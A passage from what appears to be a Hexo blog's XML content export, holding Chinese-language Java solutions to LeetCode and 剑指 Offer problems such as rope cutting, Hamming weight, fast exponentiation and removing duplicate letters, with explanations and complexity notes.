class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board , <span class="type">char</span>[] word , <span class="type">int</span> i , <span class="type">int</span> j , <span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((i &lt; <span class="number">0</span> )|| (i &gt;= board.length)||(j &lt; <span class="number">0</span> )|| (j &gt;= board[<span class="number">0</span>].length)||(board[i][j]!=word[k]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k == word.length-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//说明都找到了对应的字母</span></span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//用来标记已访问的元素，省下了bool[][] visited的空间</span></span><br><span class="line">        <span class="comment">//四个方向都搜索一次</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> dfs(board,word,i+<span class="number">1</span>,j,k+<span class="number">1</span>)||dfs(board,word,i,j+<span class="number">1</span>,k+<span class="number">1</span>)||dfs(board,word,i-<span class="number">1</span>,j,k+<span class="number">1</span>)||dfs(board,word,i,j-<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">        board[i][j] = word[k];<span class="comment">//还原找过的元素，因为之后可能还会访问到（不同路径）</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="剑指-Offer-14-I-剪绳子"><a href="#剑指-Offer-14-I-剪绳子" class="headerlink" title="剑指 Offer 14- I. 剪绳子"></a><a href="https://leetcode.cn/problems/jian-sheng-zi-lcof/">剑指 Offer 14- I. 剪绳子</a></h1><blockquote>
<p>给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]…k[m-1] 。请问 k[0]<em>k[1]</em>…*k[m-1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。</p>
</blockquote>
<h2 id="思路：动态规划-1"><a href="#思路：动态规划-1" class="headerlink" title="思路：动态规划"></a>思路：动态规划</h2><p>令 x 是拆分出的第一个正整数，则剩下的部分是 n−x，n−x 可以不继续拆分，或者继续拆分成至少两个正整数的和。由于每个正整数对应的最大乘积取决于比它小的正整数对应的最大乘积，因此可以使用动态规划求解。</p>
<p>创建数组 dp，其中 dp[i] 表示将正整数 i 拆分成至少两个正整数的和之后，这些正整数的最大乘积。特别地，0 不是正整数，1 是最小的正整数，0 和 1 都不能拆分，因此 dp[0]&#x3D;dp[1]&#x3D;0。当 i≥2 时，假设对正整数 i 拆分出的第一个正整数是（1≤j&lt;i），则有以下两种方案：</p>
<ul>
<li>将i 拆分成 j 和 i−j 的和，且 i−j 不再拆分成多个正整数，此时的乘积是 j×(i−j)；</li>
<li>将 i 拆分成 j 和 i−j 的和，且 i−j 继续拆分成多个正整数，此时的乘积是 j×dp[i−j]。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int cuttingRope(int n) &#123;</span><br><span class="line">        int[] dp = new int[n+1];</span><br><span class="line">        for(int i = 2 ; i &lt;= n ; i++)&#123;</span><br><span class="line">            int curMax = 0;</span><br><span class="line">            for(int j = 1 ; j &lt; i ; j++)&#123;</span><br><span class="line">                curMax = Math.max(curMax,Math.max(j*(i-j),j*dp[i-j]));</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = curMax;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（n2）</li>
<li>空间复杂度：O（n）</li>
</ul>
<h2 id="思路2：数学推导"><a href="#思路2：数学推导" class="headerlink" title="思路2：数学推导"></a>思路2：数学推导</h2><p>根据数学推导：<span style='color:orange'>尽可能将绳子以长度 33 等分为多段时，乘积最大。</span></p>
<ul>
<li><p>最优： 3 。把绳子尽可能切为多个长度为 3 的片段，留下的最后一段绳子的长度可能为 0,1,2 三种情况。</p>
</li>
<li><p>次优： 2 。若最后一段绳子长度为 2 ；则保留，不再拆为 1+1 。</p>
</li>
<li><p>最差： 1 。若最后一段绳子长度为 1 ；则应把一份 3+1 替换为 2+2，因为 2×2&gt;3×1。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">cuttingRope</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> n /<span class="number">3</span> , b = n %<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">0</span>)  <span class="keyword">return</span> (<span class="type">int</span>)Math.pow(<span class="number">3</span>,a);</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">1</span>)  <span class="keyword">return</span> (<span class="type">int</span>)Math.pow(<span class="number">3</span>,a-<span class="number">1</span>)*<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)Math.pow(<span class="number">3</span>,a)*<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（1）</li>
<li>空间复杂度：O（1）</li>
</ul>
<h1 id="剑指-Offer-14-II-剪绳子-II"><a href="#剑指-Offer-14-II-剪绳子-II" class="headerlink" title="剑指 Offer 14- II. 剪绳子 II"></a><a href="https://leetcode.cn/problems/jian-sheng-zi-ii-lcof/">剑指 Offer 14- II. 剪绳子 II</a></h1><blockquote>
<p>给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]…k[m - 1] 。请问 k[0]<em>k[1]</em>…*k[m - 1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。</p>
<p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: 2</span><br><span class="line">输出: 1</span><br><span class="line">解释: 2 = 1 + 1, 1 × 1 = 1</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：数学推导"><a href="#思路：数学推导" class="headerlink" title="思路：数学推导"></a>思路：数学推导</h2><p>和前一题一样的思路、理论。</p>
<p>不同之处在于需要在计算过程中取模验算。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">cuttingRope</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">3</span>) </span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> n % <span class="number">3</span>, p = <span class="number">1000000007</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> lineNums=n/<span class="number">3</span>;           <span class="comment">//线段被我们分成以3为大小的小线段个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;lineNums;i++) <span class="comment">//从第一段线段开始验算，3的ret次方是否越界。注意是验算lineNums-1次。</span></span><br><span class="line">            ret = <span class="number">3</span>*ret % p;</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> (<span class="type">int</span>)(ret * <span class="number">3</span> % p);   <span class="comment">//刚好被3整数的，要算上前一段</span></span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">1</span>) </span><br><span class="line">            <span class="keyword">return</span> (<span class="type">int</span>)(ret * <span class="number">4</span> % p);   <span class="comment">//被3整数余1的，要算上前一段</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)(ret * <span class="number">6</span> % p);       <span class="comment">//被3整数余2的，要算上前一段</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="剑指-Offer-15-二进制中1的个数"><a href="#剑指-Offer-15-二进制中1的个数" class="headerlink" title="剑指 Offer 15. 二进制中1的个数"></a><a href="https://leetcode.cn/problems/er-jin-zhi-zhong-1de-ge-shu-lcof/">剑指 Offer 15. 二进制中1的个数</a></h1><blockquote>
<p>编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为 <a href="http://en.wikipedia.org/wiki/Hamming_weight">汉明重量</a>).）。</p>
</blockquote>
<h2 id="思路：巧用n-1"><a href="#思路：巧用n-1" class="headerlink" title="思路：巧用n-1"></a>思路：巧用n-1</h2><ul>
<li>(n−1) 解析： 二进制数字 n 最右边的 1 变成 0 ，此 1 右边的 0 都变成 </li>
<li>n&amp;(n−1) 解析： 二进制数字 n 最右边的 1 变成 0 ，其余不变。</li>
</ul>
<p><img src="https://pic.leetcode-cn.com/9bc8ab7ba242888d5291770d35ef749ae76ee2f1a51d31d729324755fc4b1b1c-Picture10.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// you need to treat n as an unsigned value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>)&#123;</span><br><span class="line">            res++;</span><br><span class="line">            n &amp;= n-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="剑指-Offer-16-数值的整数次方"><a href="#剑指-Offer-16-数值的整数次方" class="headerlink" title="剑指 Offer 16. 数值的整数次方"></a><a href="https://leetcode.cn/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">剑指 Offer 16. 数值的整数次方</a></h1><blockquote>
<p>实现 <a href="https://www.cplusplus.com/reference/valarray/pow/">pow(<em>x</em>, <em>n</em>)</a> ，即计算 x 的 n 次幂函数（即，xn）。不得使用库函数，同时不需要考虑大数问题。</p>
</blockquote>
<p><img src="https://pic.leetcode-cn.com/379a042b9d8df3a96d1ac0f27346718033bf3bfce69731bab52bf6f372b4c8f4-Picture2.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>( x == <span class="number">0</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">b</span> <span class="operator">=</span> n ;</span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            x = <span class="number">1</span>/x;</span><br><span class="line">            b = -b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(b &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((b &amp; <span class="number">1</span>) == <span class="number">1</span>) res *= x;</span><br><span class="line">            x *= x;</span><br><span class="line">            b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（log2n）：二分的时间复杂度为对数级别</li>
<li>空间复杂度：O（1）</li>
</ul>
<h1 id="剑指-Offer-17-打印从1到最大的n位数"><a href="#剑指-Offer-17-打印从1到最大的n位数" class="headerlink" title="剑指 Offer 17. 打印从1到最大的n位数"></a><a href="https://leetcode.cn/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/">剑指 Offer 17. 打印从1到最大的n位数</a></h1><blockquote>
<p>输入数字 <code>n</code>，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。</p>
</blockquote>
<h2 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><p>大数越界问题： 当 n 较大时，end 会超出int32 整型的取值范围，超出取值范围的数字无法正常存储。但由于本题要求返回 int 类型数组，相当于默认所有数字都在 int32 整型取值范围内，因此可以不考虑大数越界问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] printNumbers(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> (<span class="type">int</span>)Math.pow(<span class="number">10</span>, n) - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[end];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; end; i++)</span><br><span class="line">            res[i] = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="思路2：大数打印解法"><a href="#思路2：大数打印解法" class="headerlink" title="思路2：大数打印解法"></a>思路2：大数打印解法</h2><p>实际上，本题的主要考点是大数越界情况下的打印。需要解决以下三个问题：</p>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/%E6%88%AA%E5%B1%8F2023-02-21%2022.09.29.png" alt="截屏2023-02-21 22.09.29"></p>
<p><a href="https://leetcode.cn/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/solution/mian-shi-ti-17-da-yin-cong-1-dao-zui-da-de-n-wei-2/">详解参考</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] res;</span><br><span class="line">    <span class="comment">//start表示该数字当前左边界，这个左边界意思是指当前数字最高位对应的char数组下标。如n=2时，1~9左边界为1，10~99左边界为0</span></span><br><span class="line">    <span class="comment">//nine表示当前数字中出现了多少个9，如果出现1个9，左边界就要向左移1位。例如第1次出现“9”是在9这个数字出现的时候，此时nine++变为1，</span></span><br><span class="line">    <span class="comment">//进入下次递归n为2，nine为1，start为1，此时start就要-1，以便统计二位数字</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">nine</span> <span class="operator">=</span> <span class="number">0</span>, count = <span class="number">0</span>, start, n;   </span><br><span class="line">    <span class="type">char</span>[] num, loop = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] printNumbers(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="built_in">this</span>.n = n;</span><br><span class="line">        <span class="comment">//用来保存最终数字结果的</span></span><br><span class="line">        res = <span class="keyword">new</span> <span class="title class_">int</span>[(<span class="type">int</span>)Math.pow(<span class="number">10</span>, n) - <span class="number">1</span>];   </span><br><span class="line">        <span class="comment">//num数组用来表示字符串，比如n等于2，则num数组为[&#x27;0&#x27;&#x27;0&#x27;]、[&#x27;0&#x27;&#x27;1&#x27;]、[&#x27;0&#x27;&#x27;2&#x27;]...后边是将它转为字符串并按照左边界的位置进行截取的</span></span><br><span class="line">        num = <span class="keyword">new</span> <span class="title class_">char</span>[n];  </span><br><span class="line">        start = n - <span class="number">1</span>;  <span class="comment">//最开始的左边界是从n-1，开始的，因为char数组的下标是从0开始，最末一位为n-1</span></span><br><span class="line">        dfs(<span class="number">0</span>);   <span class="comment">//从char数组的第0位开始</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="comment">//结束条件：当前x的下标越过char数组的最后一位下标n-1，此时记录结果</span></span><br><span class="line">        <span class="keyword">if</span>(x == n) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(num).substring(start);   <span class="comment">//从start开始截取字符串，如&quot;01&quot;截取后就是&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">if</span>(!s.equals(<span class="string">&quot;0&quot;</span>)) res[count++] = Integer.parseInt(s);   <span class="comment">//防止将&quot;0&quot;、&quot;00&quot;、&quot;000&quot;加进来</span></span><br><span class="line">            <span class="keyword">if</span>(n - start == nine) start--;   <span class="comment">//n减去start等于nine，表示要进位了，进位就是将左边界start左移一位，即-1</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//给char数组第x位添加数字，添加完后进入下一位</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> i : loop) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="string">&#x27;9&#x27;</span>) nine++;</span><br><span class="line">            num[x] = i;</span><br><span class="line">            dfs(x + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        nine--;   <span class="comment">//回溯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode月冲刺</title>
    <url>/2022/09/29/32-LeetCode%E6%9C%88%E5%86%B2%E5%88%BA/</url>
    <content><![CDATA[<h1 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349. 两个数组的交集"></a><a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. 两个数组的交集</a></h1><p>给定两个数组 <code>nums1</code> 和 <code>nums2</code> ，返回 <em>它们的交集</em> 。输出结果中的每个元素一定是 <strong>唯一</strong> 的。我们可以 <strong>不考虑输出结果的顺序</strong> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,2,1], nums2 = [2,2]</span><br><span class="line">输出：[2]</span><br></pre></td></tr></table></figure>

<h2 id="思路1：集合"><a href="#思路1：集合" class="headerlink" title="思路1：集合"></a>思路1：集合</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Integer&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums1)&#123;</span><br><span class="line">            set1.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num: nums2)&#123;</span><br><span class="line">            set2.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getIntersection(set1,set2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getIntersection(Set&lt;Integer&gt; set1,Set&lt;Integer&gt; set2)&#123;</span><br><span class="line">        <span class="keyword">if</span>(set1.size() &gt; set2.size())&#123;</span><br><span class="line">            <span class="keyword">return</span> getIntersection(set2,set1);</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; intersectionSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : set1)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set2.contains(num))&#123;</span><br><span class="line">                intersectionSet.add(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] intersection = <span class="keyword">new</span> <span class="title class_">int</span>[intersectionSet.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : intersectionSet)&#123;</span><br><span class="line">            intersection[index++] = num; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(m+n)</li>
<li>空间复杂度：O(m+n)</li>
</ul>
<span id="more"></span>

<h2 id="思路2：排序-双指针"><a href="#思路2：排序-双指针" class="headerlink" title="思路2：排序+双指针"></a>思路2：排序+双指针</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Arrays.sort(nums1);</span><br><span class="line">        Arrays.sort(nums2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="type">int</span>[] intersection = <span class="keyword">new</span> <span class="title class_">int</span>[length1 + length2];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// 保证加入元素的唯一性</span></span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">0</span> || num1 != intersection[index - <span class="number">1</span>]) &#123;</span><br><span class="line">                    intersection[index++] = num1;</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOfRange(intersection, <span class="number">0</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(mlogm+nlogn)</li>
<li>空间复杂度：O(logm+logn)</li>
</ul>
<h1 id="316-去除重复字母"><a href="#316-去除重复字母" class="headerlink" title="316. 去除重复字母"></a><a href="https://leetcode.cn/problems/remove-duplicate-letters/">316. 去除重复字母</a></h1><blockquote>
<p>给你一个字符串 <code>s</code> ，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证 <strong>返回结果的字典序最小</strong>（要求不能打乱其他字符的相对位置）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;bcabc&quot;</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line"></span><br><span class="line">输入：s = &quot;cbacdcbc&quot;</span><br><span class="line">输出：&quot;acdb&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：贪心-单调栈"><a href="#思路：贪心-单调栈" class="headerlink" title="思路：贪心+单调栈"></a>思路：贪心+单调栈</h2><p><a href="https://leetcode.cn/problems/remove-duplicate-letters/solution/qu-chu-zhong-fu-zi-mu-by-leetcode-soluti-vuso/">详细视频讲解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeDuplicateLetters</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输入字符串转换为字符数组（因为在遍历输入字符串的过程中，charAt会检查是否越界）</span></span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="comment">//整形数组用于记录在遍历过程中出现的字符最后出现的下标</span></span><br><span class="line">        <span class="type">int</span>[] lastIndex = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            lastIndex[s.charAt(i)-<span class="string">&#x27;a&#x27;</span>] = i ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//声明栈</span></span><br><span class="line">        Deque&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//用于记录某一个字符在栈中是否出现</span></span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="comment">//开始遍历字符串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            <span class="comment">//如果当前字符在栈中已经存在，就直接丢弃</span></span><br><span class="line">            <span class="keyword">if</span>(visited[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//否则需要判断：在栈非空的条件下，当前栈顶元素的ASCII码值严格大于当前遍历到的字符串的元素 ，并且当前栈顶元素在以后还会看到</span></span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; stack.peekLast() &gt; charArray[i] &amp;&amp; lastIndex[stack.peekLast() - <span class="string">&#x27;a&#x27;</span>]&gt;i)&#123;</span><br><span class="line">                <span class="comment">//这时候就可以把栈顶元素取出，并维护visited数组</span></span><br><span class="line">                <span class="type">Character</span> <span class="variable">top</span> <span class="operator">=</span> stack.removeLast();</span><br><span class="line">                visited[top - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//接着把当前遍历到的元素添加到栈顶，同时维护一下visited数组</span></span><br><span class="line">            stack.addLast(charArray[i]);</span><br><span class="line">            visited[charArray[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历完成之后，从当前栈底到栈顶保存的字符序列就是题目要求的输出</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : stack)&#123;</span><br><span class="line">            stringBuilder.append(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(n)</li>
</ul>
<h1 id="443-压缩字符串"><a href="#443-压缩字符串" class="headerlink" title="443. 压缩字符串"></a><a href="https://leetcode.cn/problems/string-compression/">443. 压缩字符串</a></h1><blockquote>
<p>给你一个字符数组 chars ，请使用下述算法压缩：</p>
<p>从一个空字符串 s 开始。对于 chars 中的每组 连续重复字符 ：</p>
